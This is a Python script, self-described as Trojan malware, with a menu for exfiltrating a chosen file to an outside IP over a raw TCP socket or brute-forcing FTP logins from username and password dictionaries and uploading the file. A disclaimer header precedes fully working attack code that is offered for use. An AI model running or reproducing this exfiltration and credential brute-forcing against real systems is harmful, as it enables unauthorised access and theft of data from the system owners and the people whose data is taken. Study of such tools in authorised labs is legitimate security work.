#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: March 6th 2024
# Important Note:
#  I, Nicholas Fisher, the creator of this Trojan malware, am not responsible for the misuse of 
# these scripts. They are malicious and should only be used in professionally approved White Hat 
# scenarios. You are responsible for any consequences resulting from the misuse of this malware,
# including all fines, fees, and repercussions. Please read this statement carefully: by downloading 
# any of the scripts in this repository, you, as the user, take full responsibility for storing, using,
# and testing these malicious scripts and guidelines. You also take full responsibility for any misuse 
# of this malware. Please note that any data the Trojan extracts will be posted to a GitHub repository, 
# and if that repository is public, all the extracted data will be available for the whole world to see.
# Description of Script
# This script is a versatile tool designed for exfiltrating files from both Windows and Linux 
# systems. It incorporates functionalities to transmit files directly to a specified IP address 
# or perform FTP brute force attacks followed by file uploads to the target FTP server. 
# Users are presented with an interactive menu interface, simplifying the process of selecting the 
# desired action. For instance, a user can run the script, choose to transmit a file directly by providing 
# the file name and client IP address, or opt for an FTP brute force attack by specifying the target server's 
# IP address along with the paths to username and password dictionaries. Upon successful execution, the script 
# provides informative feedback, indicating actions taken or any encountered errors, ensuring users are kept 
# informed throughout the process.
# Example output:
# Main Menu:
# 1. Transmit file directly
# 2. Brute force FTP and upload file
# 3. Exit
# Please select an option: 2
# Enter the name of the file to exfiltrate: confidential_data.txt
# Please enter the FTP server IPv4 address: 192.168.1.100
# Enter the path to the username dictionary: usernames.txt
# Enter the path to the password dictionary: passwords.txt
# FTP login successful with credentials: admin/123456
# File uploaded successfully to FTP server.
#################################################################################################
import ftplib
import os
import socket
import platform

def brute_force_ftp(username_dict, password_dict, server):
    """
    Function to perform brute force attack on FTP server using username and password dictionaries.
    
    Args:
        username_dict (str): Path to the username dictionary file.
        password_dict (str): Path to the password dictionary file.
        server (str): FTP server address.

    Returns:
        tuple: A tuple containing the successful username and password, or (None, None) if not found.
    """
    with open(username_dict, 'r') as u_file:
        usernames = u_file.read().splitlines()

    with open(password_dict, 'r') as p_file:
        passwords = p_file.read().splitlines()

    for username in usernames:
        for password in passwords:
            try:
                ftp = ftplib.FTP(server)
                ftp.login(username, password)
                print(f"FTP login successful with credentials: {username}/{password}")
                ftp.quit()
                return username, password
            except Exception as e:
                print(f"Failed login attempt: {username}/{password}")

def ftp_upload(docpath, server, username, password):
    """
    Function to upload a file to an FTP server.
    
    Args:
        docpath (str): Path to the file to be uploaded.
        server (str): FTP server address.
        username (str): FTP server username.
        password (str): FTP server password.
    """
    ftp = ftplib.FTP(server)
    ftp.login(username, password)
    ftp.cwd('/pub/')
    with open(docpath, "rb") as f:
        ftp.storbinary("STOR " + os.path.basename(docpath), f)
    ftp.quit()

def ftp_transmit(document_path, client_ip):
    """
    Function to transmit a file to a client via TCP/IP.
    
    Args:
        document_path (str): Path to the file to be transmitted.
        client_ip (str): IP address of the client.
    """
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_port = 10000
    try:
        client.connect((client_ip, client_port))
        with open(document_path, 'rb') as f:
            client.sendall(f.read())
        print("File transmitted successfully.")
    except Exception as e:
        print(f"Failed to transmit file: {e}")
    finally:
        client.close()

def main_menu():
    """
    Function to display the main menu and handle user's choice.
    """
    while True:
        print("\nMain Menu:")
        print("1. Transmit file directly")
        print("2. Brute force FTP and upload file")
        print("3. Exit")
        choice = input("Please select an option: ")
        
        if choice == '1':
            file_input = input("Enter the name of the file to exfiltrate: ")
            client_ip = input("Enter the client IP address to transmit the file: ")
            ftp_transmit(file_input, client_ip)
        elif choice == '2':
            file_input = input("Enter the name of the file to exfiltrate: ")
            server_input = input("Please enter the FTP server IPv4 address: ")
            username_dict = input("Enter the path to the username dictionary: ")
            password_dict = input("Enter the path to the password dictionary: ")
            username, password = brute_force_ftp(username_dict, password_dict, server_input)
            if username and password:
                ftp_upload(file_input, server_input, username, password)
        elif choice == '3':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please select again.")

if __name__ == '__main__':
    main_menu()
